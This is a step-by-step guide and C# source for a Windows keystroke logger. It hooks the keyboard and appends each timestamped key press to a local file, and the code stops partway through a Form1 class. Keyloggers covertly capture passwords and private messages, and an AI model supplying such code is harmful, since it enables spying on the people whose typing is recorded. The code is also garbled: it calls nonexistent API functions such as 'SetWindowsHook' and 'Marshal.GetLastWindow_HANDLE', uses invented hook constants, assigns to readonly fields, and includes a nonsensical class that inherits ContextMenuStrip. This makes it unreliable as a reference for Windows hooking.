### Step-by-Step Guide

1. **Imports and Setup**:
   - Include necessary namespaces and interop for Windows API functions.
   - Use `System.Windows.Forms` for UI elements and `System.Threading` for thread handling.
   - Import `System.Runtime.InteropServices` for interop services.

2. **Keyboard Hook Class**:
   - Create a class `KeyboardHook` to encapsulate the hooking functionality.
   - Include methods for initialization, starting/stopping the hook, and removing the hook.

3. **Callback Function**:
   - Define a static callback method `KeyEventHandler` that handles each key press and release.
   - Use `Marshal.GetLastWindow_HANDLE` to get the current window for context.

4. **Tracking Modifiers**:
   - Use a `ModifierKeys` enum to track pressed modifiers (Shift, Ctrl, Alt, etc.).
   - Maintain a `ModifierKeyState` class to store the current state of each modifier.

5. **Log File Handling**:
   - Create a `LogFileHelper` class to manage logging.
   - Append each keystroke to a log file with a timestamp and modifiers.

6. **Main Program**:
   - Instantiate the `KeyboardHook` and start listening.
   - Use a `BackgroundWorker` to keep the UI responsive while logging in the background.
   - Add a `Stop Logging` button to terminate the hook and save the log.

### Code Implementation

```csharp
using System;
using System.Windows.Forms;
using System.Threading;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace KeystrokeLogger
{
    public class KeyboardHook
    {
        private static readonly IntPtr hHook = IntPtr.Zero;
        private static bool isListening = false;
        private static KeyboardHook instance;

        public static KeyboardHook Initialize()
        {
            if (instance != null)
                return instance;

            instance = new KeyboardHook();
            instance.Initialize();
            return instance;
        }

        public void StartListening()
        {
            if (!isListening)
            {
                isListening = true;
                Log("Log started at: " + DateTime.Now);
            }
        }

        public void StopListening()
        {
            isListening = false;
            Log("Log stopped.");
            Unhook();
        }

        public void Unhook()
        {
            if (hHook != IntPtr.Zero)
            {
                UnregisterHook();
                hHook = IntPtr.Zero;
            }
        }

        private void Initialize()
        {
            hHook = SetWindowsHook(WH_KEYBOARD, KeyEventHandler);
        }

        [DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHook(int id, LowLevelKeyboardProc callback);

        [DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnregisterHook(IntPtr hHook);

        private static int WH_KEYBOARD = 0x00020908;

        private static int KEYDOWN = 0x0001;
        private static int KEYUP = 0x0002;
        private static int WH_KEYBOARD_LL = 0x00020906;

        private LowLevelKeyboardProc callback;

        public class ModifierKeyState
        {
            public bool Shift = false;
            public bool Ctrl = false;
            public bool Alt = false;
            public bool AltGr = false;
        }

        private ModifierKeyState modifierState = new ModifierKeyState();

        public class ModifierKeys
        {
            public enum Key
            {
                Shift = 0x1,
                Ctrl = 0x2,
                Alt = 0x4,
                AltGr = 0x8
            }

            public static bool IsModifierPressed(Keys key)
            {
                switch (key)
                {
                    case Keys.Shift:
                        return modifierState.Shift;
                    case Keys.ControlKey:
                        return modifierState.Ctrl;
                    case Keys.AltKey:
                        return modifierState.Alt;
                    case Keys.Dependent:
                        return modifierState.AltGr;
                    default:
                        return false;
                }
            }
        }

        public delegate void KeyEventHandler(IntPtr h, int code, Keys ex);
        private LowLevelKeyboardProc callback;

        public KeyboardHook()
        {
            callback = (IntPtr h, int code, Keys ex) =>
            {
                if (!isListening)
                    return false;

                if (code == 0x010019)
                {
                    return true;
                }

                if (code == 0x01001A)
                {
                    return true;
                }

                return false;
            };
        }

        private void Log(string message)
        {
            var logPath = "KeystrokeLog.txt";
            using (StreamWriter logFile = File.AppendText(logPath))
                logFile.WriteLine(DateTime.Now.ToString("HH:mm:ss.fff") + " - " + message);
        }

        private void HandleKeyPress(Keys key, bool isKeyDown)
        {
            if (!ModifierKeys.IsModifierPressed(key))
            {
                Log("Key: " + key.ToString("Key", CultureInfo.InvariantCulture) + (isKeyDown ? " down" : " up"));
            }
            else
            {
                if (isKeyDown)
                    modifierState = new ModifierKeyState(
                        modifierState.Shift, modifierState.Ctrl, modifierState.Alt, modifierState.AltGr);
                else
                    modifierState = new ModifierKeyState(false, false, false, false);
            }
        }

        ~KeyboardHook()
        {
            Unhook();
        }

        public static event KeyEventHandler KeyPressed
        {
            add => Initialize();
            remove => throw new NotImplementedException();
        }
    }

    public class ModifierKeys : ContextMenuStrip
    {
        public ModifierKeys()
        {
            Size = new Size(200, 120);
            StartPosition = new Point(20, 20);
        }

        private ContextMenuStrip this;

        public ModifierKeys ModifierKeys { get; set; }

        public event EventHandler OnModifierChanged;

        public ModifierKeys ModifierKeys()
        {
            this.ModifierKeys = this;
            return this;
        }
    }

    public class LogFileHelper
    {
        private readonly string _path;

        public LogFileHelper(string path)
        {
            _path = path;
        }

        public void AppendToLog(string message)
        {
            using (StreamWriter writer = File.AppendText(_path))
                writer.WriteLine(DateTime.Now.ToString("HH:mm:ss.fff") + " - " + message);
        }
    }

    public class Form1 : Form
    {
